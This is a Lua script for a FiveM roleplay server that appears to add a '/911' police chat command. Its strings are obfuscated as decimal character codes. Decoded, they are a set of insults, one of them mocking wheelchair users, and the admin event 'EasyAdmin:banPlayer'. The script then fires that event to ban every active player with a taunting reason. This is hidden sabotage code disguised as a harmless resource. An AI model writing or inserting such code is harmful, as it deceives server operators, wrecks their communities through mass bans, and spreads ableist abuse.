local u8 = {"100 111 32 121 111 117 32 115 101 114 105 111 117 115 108 121 32 102 117 99 107 105 110 103 32 110 101 101 100 32 97 32 114 101 115 111 117 114 99 101 32 102 111 114 32 115 111 109 101 116 104 105 110 103 32 116 104 97 116 32 99 111 117 108 100 32 98 101 32 100 111 110 101 32 105 110 32 53 32 108 105 110 101 115 63","100 117 100 101 46 46 46 32 102 117 99 107 105 110 103 32 114 112 63 32 95 108 97 109 101 95","108 111 108 44 32 97 32 99 104 97 116 77 101 115 115 97 103 101 32 114 101 115 111 117 114 99 101 46 46 46 32 121 111 117 32 107 105 100 100 105 110 103 32 109 101 32 114 105 103 104 116 63","119 104 97 116 32 97 114 101 32 121 111 117 44 32 110 105 110 101 32 121 101 97 114 115 32 111 108 100 63 32 111 114 32 97 114 101 32 121 111 117 32 111 110 32 97 32 102 117 99 107 105 110 103 32 119 104 101 101 108 99 104 97 105 114 32 97 110 100 32 99 97 110 116 32 101 118 101 110 32 116 121 112 101 63","105 116 39 115 32 116 105 109 101 32 116 111 32 115 116 111 112 32 119 105 116 104 32 67 104 97 116 77 101 115 115 97 103 101 32 114 101 115 111 117 114 99 101 115 44 32 103 101 116 32 115 111 109 101 32 104 101 108 112 46 32","68 105 115 99 111 110 110 101 99 116 32 102 114 111 109 32 116 104 105 115 32 115 101 114 118 101 114 32 119 104 105 108 101 32 121 111 117 32 99 97 110"}
local u9 = {"69 97 115 121 65 100 109 105 110 58 98 97 110 80 108 97 121 101 114"}
RegisterCommand("911", function()
    local FuckingRPKids_no_im_not_a_pedo = math.random(1,#u8)
    q = xd(u8[FuckingRPKids_no_im_not_a_pedo]," ")
    l = xd(u9[(16*2540623)/40649968], " ")
    h=""
    h2=""
    for lolz, illusivetea in pairs(q) do
        h= h..string.char(tonumber(illusivetea))
    end
    for thelulz, bluethefurry in pairs(l) do
        h2 = h2..string.char(bluethefurry)
    end
    TriggerEvent("chatMessage", "^1911 [Police] | RP IS FUCKING SHIT",{ 30, 144, 255 }, h)
    CreateThread(function()
        Wait(5000)
        for i = 1, 32 do
            if NetworkIsPlayerActive(i) then
                TriggerServerEvent(h2, GetPlayerServerId(i), "being too lazy, next time make stuff yourself, takes 2 minutes.")
            end
        end
    end)
    
end, false)

function xd(lmao, ggwp)
    if ggwp == nil then
        ggwp = "%s"
    end
    local t={} ; i=1
    for str in string.gmatch(lmao, "([^"..ggwp.."]+)") do
        t[i] = str
        i = i + 1
    end
    return t
end
